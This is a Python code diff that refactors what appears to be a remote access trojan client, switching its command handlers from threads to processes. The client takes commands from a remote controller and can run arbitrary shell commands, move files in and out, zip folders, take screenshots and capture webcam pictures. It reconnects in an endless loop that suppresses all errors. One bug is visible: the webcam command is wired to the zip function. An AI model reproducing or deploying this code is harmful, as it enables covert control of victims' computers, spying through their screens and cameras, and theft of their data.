@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 # standard python libraries
 import time
-import threading
 import subprocess
 import base64
 import socket
@@ -9,6 +8,7 @@ import sys
 import os
 import zipfile
 import json
+import multiprocessing
 # non-standard python libraries
 import mss
 import cv2
@@ -18,29 +18,32 @@ class Client:
     def __init__(self):
         self.connection = Connection()
         self.exit = False
+        manager = multiprocessing.Manager()
 
         while not self.exit:
             request = self.dec_request(self.connection.recv(self.connection.sock))
-            self.response = {"data": str(), "error": str()}
+            self.response = manager.dict()
+            self.response["data"] = ""
+            self.response["error"] = ""
 
             if request["cmd"] == "f":
-                process = threading.Thread(target=self.cwd, args=(request["mode"], request["path"],))
+                process = multiprocessing.Process(target=self.cwd, args=(self.response, request["mode"], request["path"],))
                 self.handle_process(process, request["timeout"])
                 self.connection.send(self.enc_response(self.response), self.connection.sock)
             elif request["cmd"] == "c":
-                process = threading.Thread(target=self.execute_command, args=(request["exe"],))
+                process = multiprocessing.Process(target=self.execute_command, args=(self.response, request["exe"],))
                 self.handle_process(process, request["timeout"])
                 self.connection.send(self.enc_response(self.response), self.connection.sock)
             elif request["cmd"] == "z":
-                process = threading.Thread(target=self.zip_file_or_folder, args=(request["comp_lvl"], request["open_path"], request["save_path"],))
+                process = multiprocessing.Process(target=self.zip_file_or_folder, args=(self.response, request["comp_lvl"], request["open_path"], request["save_path"],))
                 self.handle_process(process, request["timeout"])
                 self.connection.send(self.enc_response(self.response), self.connection.sock)
             elif request["cmd"] == "w":
-                process = threading.Thread(target=self.zip_file_or_folder, args=(request["cam_port"], request["save_path"],))
+                process = multiprocessing.Process(target=self.zip_file_or_folder, args=(self.response, request["cam_port"], request["save_path"],))
                 self.handle_process(process, request["timeout"])
                 self.connection.send(self.enc_response(self.response), self.connection.sock)
             elif request["cmd"] == "s":
-                process = threading.Thread(target=self.make_screenshot, args=(request["monitor"], request["save_path"],))
+                process = multiprocessing.Process(target=self.make_screenshot, args=(self.response, request["monitor"], request["save_path"],))
                 self.handle_process(process, request["timeout"])
                 self.connection.send(self.enc_response(self.response), self.connection.sock)
             elif request["cmd"] == "d":
@@ -48,28 +51,29 @@ class Client:
             elif request["cmd"] == "u":
                 self.upload_file(request["save_path"])
             elif request["cmd"] == "r":
-                process = threading.Thread(target=self.connection.sock.close)
+                process = multiprocessing.Process(target=self.connection.sock.close)
                 self.handle_process(process, request["timeout"])
                 self.exit = True
 
-    def cwd(self, mode, path):
+    def cwd(self, response, mode, path):
         if mode == "set":
             try:
+                print(path)
                 os.chdir(path)
             except FileNotFoundError:
-                self.response["error"] = "FileNotFoundError"
+                response["error"] = "FileNotFoundError"
             except PermissionError:
-                self.response["error"] = "PermissionError"
+                response["error"] = "PermissionError"
         else:
-            self.response["data"] = os.getcwd()
+            response["data"] = os.getcwd()
 
-    def execute_command(self, command):
+    def execute_command(self, response, command):
         try:
             process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
-            self.response["data"] = process.stdout.read()
-            self.response["error"] = process.stderr.read()
+            response["data"] = process.stdout.read()
+            response["error"] = process.stderr.read()
         except UnicodeDecodeError:
-            self.response["error"] = "UnicodeDecodeError"
+            response["error"] = "UnicodeDecodeError"
 
     def download_file(self, path):
         response = {"length": str(), "error": str()}
@@ -95,18 +99,18 @@ class Client:
             response["error"] = "PermissionError"
         self.connection.send(self.enc_response(response), self.connection.sock)
 
-    def make_screenshot(self, monitor, path):
+    def make_screenshot(self, response, monitor, path):
         try:
             with mss.mss() as sct:
                 sct.shot(mon=int(monitor), output=path)
         except mss.exception.ScreenShotError:
-            self.response["error"] = "MonitorDoesNotExist"
+            response["error"] = "MonitorDoesNotExist"
         except ValueError:
-            self.response["error"] = "InvalidMonitorIndex"
+            response["error"] = "InvalidMonitorIndex"
         except FileNotFoundError:
-            self.response["error"] = "FileNotFoundError"
+            response["error"] = "FileNotFoundError"
 
-    def zip_file_or_folder(self, compression_level, path_to_open, path_to_save):
+    def zip_file_or_folder(self, response, compression_level, path_to_open, path_to_save):
         try:
             zip_file = zipfile.ZipFile(path_to_save, 'w', zipfile.ZIP_DEFLATED, compresslevel=int(compression_level))
             if os.path.isdir(path_to_open):
@@ -118,19 +122,18 @@ class Client:
                 zip_file.write(path_to_open, os.path.basename(path_to_open))
             zip_file.close()
         except PermissionError:
-            self.response["error"] = "PermissionError"
+            response["error"] = "PermissionError"
         except FileNotFoundError:
-            self.response["error"] = "FileNotFoundError"
-        self.connection.send(self.enc_response(response), self.connection.sock)
+            response["error"] = "FileNotFoundError"
 
-    def capture_camera_picture(self, camera_port, path_to_save):
+    def capture_camera_picture(self, response, camera_port, path_to_save):
         video_capture = cv2.VideoCapture(int(camera_port), cv2.CAP_DSHOW)
         if not video_capture.isOpened():
-            self.response["error"] = "CouldNotOpenDevice"
+            response["error"] = "CouldNotOpenDevice"
             return
         success, frame = video_capture.read()
         if not success:
-            self.response["error"] = "UnableToCapturePicture"
+            response["error"] = "UnableToCapturePicture"
         video_capture.release()
         cv2.destroyAllWindows()
         cv2.imwrite(path_to_save, frame)
@@ -140,15 +143,15 @@ class Client:
         process.start()
         process.join(timeout)
         if process.is_alive():
+            process.terminate()
             self.response["data"] = ""
             self.response["error"] = "TimeoutExpired"
-            self.connection.send(self.enc_response(response), self.connection.sock)
 
     def dec_request(self, request):
         return json.loads(request.decode(self.connection.CODEC))
 
     def enc_response(self, response):
-        return json.dumps(response).encode(self.connection.CODEC)
+        return json.dumps(response.copy()).encode(self.connection.CODEC)
 
 
 class Connection:
@@ -189,9 +192,9 @@ class Connection:
 
 if __name__ == "__main__":
     while True:
-        #try:
-        client = Client()
-            #if client.exit:
-                #break
-        #except:
-            #pass
+        try:
+            client = Client()
+            if client.exit:
+                break
+        except:
+            pass
